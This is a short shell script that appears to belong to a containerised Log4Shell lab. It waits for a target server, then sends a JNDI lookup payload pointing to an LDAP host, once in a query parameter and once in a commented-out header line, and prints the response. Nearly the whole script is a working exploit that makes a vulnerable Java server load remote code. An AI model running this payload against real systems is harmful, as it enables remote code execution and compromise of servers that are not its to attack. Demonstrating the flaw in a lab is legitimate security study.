#!/bin/sh

function wait() {
    echo "ðŸ’¤ Waiting for $1:$2 server ..."
    sh -c 'until ping -c1 $0 >/dev/null 2>&1; do sleep 0.5; done' $1
    sh -c 'until nc -z $0 $1; do sleep 0.5; done' $1 $2
    echo "ðŸ‘Œ $1:$2 is listening!"
}

wait log4shell-server 8080

echo "ðŸš€ Sending attack vector ..."
RES=$(curl -si -G 'log4shell-server:8080/hello' --data-urlencode 'name=${jndi:ldap://ldap-server:1389/attack-vector}')
# RES=$(curl -si 'log4shell-server:8080/hello?name=world' -H 'X-Header: ${jndi:ldap://ldap-server:1389/attack-vector}')
echo "ðŸ”¥ Server returned:"
echo "$RES" | while read line; do echo "> $line"; done

echo "Attack should be successfull, have a nice day!"
